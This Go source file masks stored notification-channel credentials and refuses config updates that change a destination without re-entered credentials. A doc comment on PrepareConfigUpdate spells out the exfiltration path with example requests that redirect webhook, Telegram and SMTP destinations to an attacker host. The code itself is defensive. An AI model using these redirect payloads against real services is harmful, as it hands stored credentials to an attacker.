package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix of a masked value. When the API echoes credentials it replaces
// the real content with a value carrying this prefix, and when the update endpoint receives a value
// with this prefix it understands it as "keep the stored value unchanged".
//
// A prefix is used rather than an empty string or a fixed constant so that a little identifying
// information can come along (see MaskedValue), letting users tell "which bot this is" without
// pasting the key again.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short, so no hint at all
//	"__masked__:…ab12cd"      the last 6 characters of the original as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: a webhook URL's identifying
// information is at the end (e.g. the WeCom key or the Feishu bot id), while the prefix is the same
// for every bot and has no identifying value. The last 6 characters aren't enough to recover the
// credential, but they are enough for whoever configured it to recognise "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. it was not modified after the API echoed it).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with this channel's credential fields replaced by masked
// values.
//
// An unknown channel kind returns an empty map rather than the original config: better to let the
// UI show "config unavailable" than to spit back raw content that may contain credentials when the
// channel kind can't be recognised. Non-credential fields are kept as is so the UI can display them.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a whole: judging each
		// sub-key would need every channel to declare yet another set of "which sub-keys are
		// credentials" rules, and the complexity far outweighs the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination changed, but the caller didn't take
// a position on the credential fields". It is returned instead of silently allowing the change or
// silently dropping the credentials; see PrepareConfigUpdate for why.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "destination (" + strings.Join(e.Changed, ", ") + ") has changed, so the credential fields (" +
		strings.Join(e.Missing, ", ") + ") must be re-entered too: enter new values, or explicitly leave them blank if credentials are no longer needed; " +
		"the old credentials are only valid for the old destination, and reusing them would hand them over to the new one"
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive case of a
// "destination change".
//
// It replaces the bare MergeConfig on the channel update path, and closes this path, verified to
// work in practice: the destination (where the message goes) and the credentials (which identity it
// is sent as) are two independent sets of fields, and MergeConfig keeps the stored value for every
// "unmentioned key". So anyone who can PATCH a channel can, by **changing only the destination and
// saying nothing about the credentials**, make the server send the real stored credentials to an
// endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<real token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and doesn't depend on redirects (so refusing cross-host redirects
// doesn't stop it), and it directly defeats the goal of this package's masking mechanism:
// "credentials are never echoed back to the browser".
//
// Rule: as soon as any destination key is changed to a new value, the caller must take an explicit
// position on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs credentials (keeps the clearing semantics)
//   - echo back the masked value / simply not mention the key → rejected
//
// The third case is rejected too because a "masked value" means precisely "reuse the old
// credentials", and the old credentials are only valid for the old destination. It deliberately
// doesn't "drop the credentials automatically": for optional credential fields (webhook headers,
// email password) that would silently turn into "authentication is gone but the endpoint returns
// 200", which is harder to troubleshoot than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// A masked literal embedded inside a non-string credential value (e.g. webhook headers is an
	// object) means the caller has put the "keep the original" sentinel inside a structure.
	// MergeConfig only recognises "a string with the prefix" as masked, so this shape would be
	// stored as an ordinary object: the database really ends up with the literal "__masked__", and
	// later authentication silently fails without any error. Better to reject it.
	//
	// This check must come **first**: when the destination hasn't changed there is an early return,
	// and putting it later would cover only the "destination changed" path (the first version put it
	// in exactly that wrong place, and the tests caught it straight away).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that really changed. A masked value counts as "unchanged".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// Destination unchanged: do a normal merge (masked values keep the stored value, empty
		// strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// Destination changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the mask sentinel in a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field like webhook headers
// can only be masked as a whole (written as the string "__masked__") or submitted as a whole; putting
// the sentinel inside the object can't express "keep unchanged", and it gets stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left blank as a whole to keep the current value, or submitted as a whole with a new value; a mask placeholder cannot be embedded inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue reports whether two config values are equivalent. Comparing via JSON
// serialisation also takes care of type differences: the port submitted by the frontend is a
// number, while the one read back from the database is a float64, and a direct == would misjudge it.
//
// "Blank" must be normalised before comparing: an empty string and "key absent" are the same state
// in this config model, because MergeConfig treats an empty string as an explicit clear and deletes
// the key. Without normalising, an optional destination field that is always left blank (Telegram's
// base_url is the only such field: blank means the official URL) would go down this path:
//
//	base_url:"" stored at creation  →  first save, MergeConfig deletes the key
//	→ second save: incoming is "" and stored lacks the key, so it is judged "destination changed"
//	→ the credential is a masked value → 400 "destination has changed, so the credential fields must be re-entered"
//
// From then on every save fails unless the user pastes the Bot Token again, even though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The criterion must match MergeConfig's clearing check (strings.TrimSpace(s) == ""), otherwise
// there is a gap where "MergeConfig thinks it should be deleted but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - keys in incoming with a masked value → keep stored's original value (the user didn't change that field)
//   - keys in incoming with an empty string → treated as an explicit clear, delete the key
//   - other keys → overwrite with incoming's value
//   - keys in stored but not in incoming → keep (partial update semantics)
//
// Whether an empty string counts as "clear" has to be decided explicitly: the frontend form submits
// unfilled fields as empty strings, and writing that in as a valid value would really clear fields
// that were "left blank to keep the original". Explicit clearing is chosen here because when a
// wrongly set field needs removing, the user has no other way to say so (omitting the field could
// distinguish "not provided" from "provided as empty", but the UI has no use for that distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
